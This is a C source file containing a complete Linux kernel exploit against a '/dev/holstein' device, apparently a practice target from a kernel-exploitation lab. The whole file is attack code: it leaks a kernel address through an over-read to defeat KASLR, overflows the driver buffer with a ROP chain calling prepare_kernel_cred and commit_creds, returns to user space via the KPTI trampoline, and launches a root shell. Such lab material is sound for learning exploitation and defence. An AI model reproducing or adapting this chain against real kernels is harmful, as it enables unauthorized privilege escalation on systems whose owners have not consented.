#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define ERR(msg)                                                               \
  do {                                                                         \
    perror(msg);                                                               \
    exit(EXIT_FAILURE);                                                        \
  } while (0)
unsigned long user_cs, user_ss, user_rsp, user_rflags;
#define prepare_kernel_creed (kbase + 0x6e240)
#define commit_creds (kbase + 0x6e390)
#define pop_rdi (kbase + 0x27bbdc)
#define pop_rcx (kbase + 0x32cdd3)
#define mov_rdi_rax_rep_movsq (kbase + 0x60c96b)
#define kpti_trampoline (kbase + 0x800e26)

static void save_state() {
  __asm__(".intel_syntax noprefix;"
          "mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_rsp, rsp;"
          "pushf;"
          "pop user_rflags;"
          ".att_syntax;");
}

static void shell() {
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  puts("ROOOOT");
  execve("/bin/sh", argv, envp);
}

int main() {
  save_state();
  int fd = open("/dev/holstein", O_RDWR);
  if (fd == -1) {
    perror("open");
    exit(EXIT_FAILURE);
  }

  char buf[0x500];
  memset(buf, 'A', 0x480);
  read(fd, buf, 0x410);

  unsigned long leak = *(unsigned long *)(buf + 0x408);
  printf("leak: 0x%16lx\n", leak);
  unsigned long kbase = leak - (0xffffffff8113d33c - 0xffffffff81000000);
  printf("kbase: 0x%16lx\n", kbase);
  printf("commit_creds: 0x%16lx\n", commit_creds);
  printf("prepare_kernel_creed: 0x%16lx\n",
         prepare_kernel_creed);
  printf("kpti kpti_trampoline: 0x%16lx\n",
         kpti_trampoline);
  printf("pop rdi: 0x%16lx\n", pop_rdi);
  printf("pop rcx: 0x%16lx\n", pop_rcx);

  unsigned long *chain = (unsigned long *)(buf + 0x408);
  *chain++ = pop_rdi;
  *chain++ = 0;
  *chain++ = prepare_kernel_creed;
  *chain++ = pop_rcx;
  *chain++ = 0;
  *chain++ = mov_rdi_rax_rep_movsq;
  *chain++ = commit_creds;
  *chain++ = kpti_trampoline;
  *chain++ = 0xdeadbeef;
  *chain++ = 0xdeadbeef;
  *chain++ = (unsigned long)(shell);
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_rsp;
  *chain++ = user_ss;
  write(fd, buf, (void *)chain - (void *)buf);

  close(fd);
  return EXIT_SUCCESS;
}
